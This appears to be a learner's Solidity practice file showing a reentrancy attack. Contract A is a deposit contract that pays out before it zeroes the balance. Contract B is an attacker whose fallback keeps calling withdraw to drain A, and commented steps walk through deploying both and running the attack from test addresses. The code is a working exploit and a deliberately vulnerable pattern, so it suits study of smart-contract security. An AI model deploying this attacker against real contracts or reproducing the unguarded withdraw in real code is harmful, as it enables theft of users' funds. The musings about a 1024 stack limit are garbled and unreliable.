// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.6;
// https://docs.openzeppelin.com/contracts/4.x/api/security
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

// external csc

contract A {
    mapping(address => uint256) public addressToBalance;

    function deposit() public payable {
        addressToBalance[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 bal = addressToBalance[msg.sender];
        require(bal > 0);
        (bool sent, ) = msg.sender.call{value: bal}("");

        require(sent, "failure");
        addressToBalance[msg.sender] = 0;
    }
}

contract B {
    A public a;

    constructor(address victimContract) {
        a = A(victimContract);
    }

    fallback() external payable {
        if (address(a).balance >= 1 ether) {
            a.withdraw();
        }
    }

    //     receive() external payable — for empty calldata (and any value)
    // fallback() external payable — when no other function matches (not even the receive function). Optionally payable.

    function attack() external payable {
        require(msg.value >= 1 ether);
        a.deposit{value: 1 ether}();
        a.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

//  if we have stack of 1024 qand contract has
//  eth of more tyhan 1024 it will crash and aattack will fail?

//  if we have stack of 1024 qand contract has eth of more tyhan 1024 it will crash and aattack will fail?
// so contract a in b as some random contract??
// ;ater intialized wiht a address

// pragma solidity ^0.8.6;

// contract A{
//     mapping(address=> uint) public balances;

//     function deposit() public payable{
//         balances[msg.sender]+=msg.value;
//     }

//     function withdraw() public {
//         uint256 bal=balances[msg.sender];
//         require(bal>0);
//         (bool sent,)=msg.sender.call{value:bal}("");
//         require(sent,"failure");
//         balances[msg.sender]=0;
//     }

//     function getBalance() public view returns(uint){
//         return address(this).balance;
//     }

// }

// contract B{
//     A public a;
//     constructor(address _aAddress){
//         a=A(_aAddress);
//     }

//     fallback() external payable{
//         if(address(a).balance>=1 ether){
//             a.withdraw();

//         }
//     }

//     function attack() external payable{
//         require(msg.value>=1 ether);
//         a.deposit{value: 1 ether}();
//         a.withdraw();
//     }

//     function getBalance() public view returns(uint){
//         return address(this).balance;
//     }
// }

// //step no 1 - deploy A smart contract
// //step no 2- copy address of deployed A SC
// //step no 3- deploy B smart contract using address of A SC
// //step no 4- deposit 5 ether from 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2 to SC
// //step no 5- deposit 5 ether from 0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db
// //step no 6- attack A from 0x78731D3Ca6b7E34aC0F824c42a7cC18A495cabaB by depositing 1 ether
